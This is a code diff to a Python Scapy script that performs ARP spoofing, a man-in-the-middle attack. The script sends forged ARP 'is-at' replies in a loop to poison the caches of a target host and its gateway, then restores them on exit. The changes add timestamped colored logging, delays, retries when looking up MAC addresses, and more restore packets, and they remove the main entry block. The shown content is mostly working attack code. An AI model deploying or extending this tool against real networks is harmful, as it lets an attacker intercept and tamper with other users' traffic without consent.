@@ -1,5 +1,6 @@
 from scapy.all import *
 import sys
+import time
 
 def mac(ip):
     ether = Ether(dst = "ff:ff:ff:ff:ff:ff")
@@ -23,7 +24,9 @@ def spoof(target_ip, getawey_ip, target_mac, getawey_mac):
 
     my_mac = Ether().src
 
-    print("[*] Arp Spoof {0} : {1} is-at {2}".format(target_mac, getawey_mac, my_mac))
+    now = time.localtime()
+    print(u"\u001b[0m[" + str(now.tm_hour) + ":" + str(now.tm_min) + ":" + str(now.tm_sec) + "]" + " Arp Spoof {0} : {1} is-at {2}".format(target_mac, getawey_mac, my_mac))
+    time.sleep(0.5)
 
 
 def comin(target_ip, getawey_ip, target_mac, getawey_mac):
@@ -34,12 +37,18 @@ def comin(target_ip, getawey_ip, target_mac, getawey_mac):
 
     my_mac = Ether().src
 
-    print("[+] Restoring {0} : {1} is-at {2}".format(target_mac, getawey_mac, getawey_mac))
+    now = time.localtime()
+    print(u"\u001b[34m[" + str(now.tm_hour) + ":" + str(now.tm_min) + ":" + str(now.tm_sec) + "]" + " Restoring {0} : {1} is-at {2}".format(target_mac, getawey_mac, getawey_mac))
+    time.sleep(0.5)
 
 
 def start(target_ip, getawey_ip):
-    target_mac = mac(target_ip)
-    getawey_mac = mac(getawey_ip)
+    for j in range(3):
+        target_mac = mac(target_ip)
+        getawey_mac = mac(getawey_ip)
+        if target_mac and getawey_mac:
+            break
+        time.sleep(3)
 
     while True:
         spoof(target_ip, getawey_ip, target_mac, getawey_mac)
@@ -48,15 +57,12 @@ def start(target_ip, getawey_ip):
 
 
 def stop(target_ip, getawey_ip):
-    target_mac = mac(target_ip)
-    getawey_mac = mac(getawey_ip)
+    for j in range(3):
+        target_mac = mac(target_ip)
+        getawey_mac = mac(getawey_ip)
+        if target_mac and getawey_mac:
+            break
+        time.sleep(3)
 
-    for i in range(0, 7):
+    for i in range(0, 15):
         comin(target_ip, getawey_ip, target_mac, getawey_mac)
-
-
-try:
-    start(sys.argv[1], sys.argv[2])
-except KeyboardInterrupt:
-    print("[!] please waite # restoring...")
-    stop(sys.argv[1], sys.argv[2])
